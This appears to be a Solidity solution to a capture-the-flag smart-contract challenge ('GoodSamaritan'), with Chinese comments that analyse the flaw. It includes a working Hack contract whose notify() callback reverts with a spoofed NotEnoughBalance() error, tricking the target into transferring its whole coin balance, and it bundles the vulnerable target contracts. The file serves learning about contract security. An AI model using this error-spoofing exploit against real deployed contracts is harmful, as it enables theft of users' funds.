// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

/**
 * 1、题目分析
 * 1）GoodSamaritan 创建了一个 Wallet 钱包实例和 Coin 代币实例，捐赠 10 个或剩余代币；Wallet 合约则使用了 Coin 合约，通过调用 transfer 函数来转移代币
 * owner + coin => wallet => GoodSamaritan(donate10 或剩余代币)
 * 2) Goal: drain coin balance from the wallet
 * 3) 漏洞：transfer 里能调用 hack 合约的函数, 抛出错误
 *    - INotifyable(dest_).notify(amount_)里面的 dest_如果是 hack 合约的话，会调用 hack 合约的 notify 函数。
 *    - 余额不足 10 时，转移全部
 *    - hack.notify() => revert "NotEnoughBalance()" => transfer 所有代币
 */

interface IGood {
    function coin() external view returns (address);

    function requestDonation() external returns (bool enoughBalance);
}

interface ICoin {
    function balances(address) external view returns (uint256);
}

contract Hack {
    IGood private immutable target;
    ICoin private immutable coin;

    error NotEnoughBalance();

    constructor(IGood _target) {
        target = _target;
        coin = ICoin(_target.coin());
    }

    // Good 的 requestDonation() => wallet 的 donate10() => coin 的transfer() => hack 的 notify() => revert "NotEnoughBalance()" => Good 的 transferRemainder() => transfer 转移所有代币(hack.notify() 的所有代币)
    function pwn() external {
        target.requestDonation();
        require(coin.balances(address(this)) == 10 ** 6, "hack failed");
    }

    function notify(uint amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        // 调用wallet合约的setCoin函数，将coin合约实例设置为wallet合约中的代币。
        wallet.setCoin(coin);
    }

    function requestDonation() external returns (bool enoughBalance) {
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (
                // 如果异常类型是NotEnoughBalance()，表示余额不足
                keccak256(abi.encodeWithSignature("NotEnoughBalance()")) ==
                keccak256(err)
            ) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

// 代币转账
contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    // InsufficientBalance，当转账时余额不足时会抛出这个错误
    error InsufficientBalance(uint256 current, uint256 required);

    // 初始化了一个地址为wallet_的余额为100万的硬币
    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10 ** 6;
    }

    //
    function transfer(address dest_, uint256 amount_) external {
        // 获取发送者的当前余额 currentBalance
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if (amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            // dest_.isContract() 是否是一个合约地址
            if (dest_.isContract()) {
                // notify contract
                // 将dest_地址转换为类型为INotifyable的合约实例，调用该合约实例的notify函数，并传入amount_作为参数，以通知合约有一定数量的金额转入。
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    // 向指定的地址dest_捐赠10个代币
    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    // 将钱包中剩余的代币转移到指定的地址dest_
    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    // 设置代币合约的实例
    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

// 定义了一个函数notify，用于在其他合约中实现通知功能
interface INotifyable {
    function notify(uint256 amount) external;
}
